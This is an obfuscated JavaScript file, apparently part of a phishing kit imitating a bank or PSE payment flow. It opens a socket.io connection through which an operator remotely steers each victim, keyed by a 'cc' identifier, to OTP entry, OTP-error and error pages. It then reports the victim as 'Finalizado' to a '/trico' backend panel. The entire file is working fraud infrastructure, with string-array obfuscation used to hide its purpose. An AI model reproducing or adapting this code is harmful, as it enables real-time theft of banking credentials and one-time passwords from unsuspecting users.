function _0x51fc(_0x394cba, _0x1643b4) {
  const _0x49b33c = _0x49b3();
  return (
    (_0x51fc = function (_0x51fc14, _0x223d35) {
      _0x51fc14 = _0x51fc14 - 0x15c;
      let _0x44c22f = _0x49b33c[_0x51fc14];
      return _0x44c22f;
    }),
    _0x51fc(_0x394cba, _0x1643b4)
  );
}
(function (_0x256a94, _0x548445) {
  const _0xc1028b = _0x51fc,
    _0x4fc7d7 = _0x256a94();
  while (!![]) {
    try {
      const _0x3fcbe8 =
        (parseInt(_0xc1028b(0x16c)) / 0x1) *
          (parseInt(_0xc1028b(0x168)) / 0x2) +
        parseInt(_0xc1028b(0x170)) / 0x3 +
        (parseInt(_0xc1028b(0x15f)) / 0x4) *
          (-parseInt(_0xc1028b(0x160)) / 0x5) +
        (-parseInt(_0xc1028b(0x166)) / 0x6) *
          (parseInt(_0xc1028b(0x172)) / 0x7) +
        parseInt(_0xc1028b(0x175)) / 0x8 +
        -parseInt(_0xc1028b(0x16a)) / 0x9 +
        parseInt(_0xc1028b(0x15e)) / 0xa;
      if (_0x3fcbe8 === _0x548445) break;
      else _0x4fc7d7["push"](_0x4fc7d7["shift"]());
    } catch (_0x3dc8a7) {
      _0x4fc7d7["push"](_0x4fc7d7["shift"]());
    }
  }
})(_0x49b3, 0xde331);
function _0x49b3() {
  const _0x141808 = [
    "GET",
    "href",
    "10893416fzZTVD",
    "newOtp",
    "metaInfo",
    "valor",
    "log",
    "otp",
    "18982170sFKMrC",
    "147688JLlAeb",
    "95fPzeJM",
    "json",
    "./errorPse.html",
    "valid",
    "Finalizado",
    "idreg",
    "498mSeDNw",
    "./otp.error.html",
    "2LFBXzI",
    "PUT",
    "15474708fKqzhq",
    "stringify",
    "1461307bueiqr",
    "application/json",
    "finish",
    "location",
    "115860TYdeFi",
    "user",
    "120498AbWvGh",
  ];
  _0x49b3 = function () {
    return _0x141808;
  };
  return _0x49b3();
}
var socket = io["connect"](url);
socket["on"]("ps", function (_0x3a7073) {
  const _0x46d156 = _0x51fc;
  if (
    _0x3a7073["valor"] == _0x46d156(0x171) &&
    _0x3a7073[_0x46d156(0x163)] == info[_0x46d156(0x177)]["cc"]
  )
    window[_0x46d156(0x16f)][_0x46d156(0x174)] = "./index.error.html";
  else {
    if (
      _0x3a7073[_0x46d156(0x178)] == _0x46d156(0x15d) &&
      _0x3a7073["valid"] == info[_0x46d156(0x177)]["cc"]
    )
      window["location"][_0x46d156(0x174)] = "./otp.html";
    else {
      if (
        _0x3a7073[_0x46d156(0x178)] == _0x46d156(0x176) &&
        _0x3a7073[_0x46d156(0x163)] == info["metaInfo"]["cc"]
      )
        window[_0x46d156(0x16f)][_0x46d156(0x174)] = _0x46d156(0x167);
      else {
        if (
          _0x3a7073["valor"] == _0x46d156(0x16e) &&
          _0x3a7073["valid"] == info["metaInfo"]["cc"]
        ) {
          async function _0xafcdaf() {
            const _0x39e0 = _0x46d156,
              _0x4bc254 = await fetch(url + "/trico/tricoData", {
                method: _0x39e0(0x173),
                headers: { "Content-Type": _0x39e0(0x16d) },
              }),
              _0x35f788 = await _0x4bc254[_0x39e0(0x161)](),
              _0x2a8d4f = [..._0x35f788];
            for (const _0x32512c of _0x2a8d4f) {
              if (_0x32512c["id"] == info["metaInfo"]["cc"]) {
                console[_0x39e0(0x15c)]("Usuario\x20encontrado");
                const _0x1452f9 = await fetch(
                    url + "/trico/tricofinishPse/" + _0x32512c[_0x39e0(0x165)],
                    {
                      method: _0x39e0(0x169),
                      headers: { "Content-Type": _0x39e0(0x16d) },
                      body: JSON[_0x39e0(0x16b)]({ estado: _0x39e0(0x164) }),
                    }
                  ),
                  _0x9523ef = await _0x1452f9[_0x39e0(0x161)]();
              }
            }
            window[_0x39e0(0x16f)][_0x39e0(0x174)] = _0x39e0(0x162);
          }
          _0xafcdaf();
          return;
        }
      }
    }
  }
});
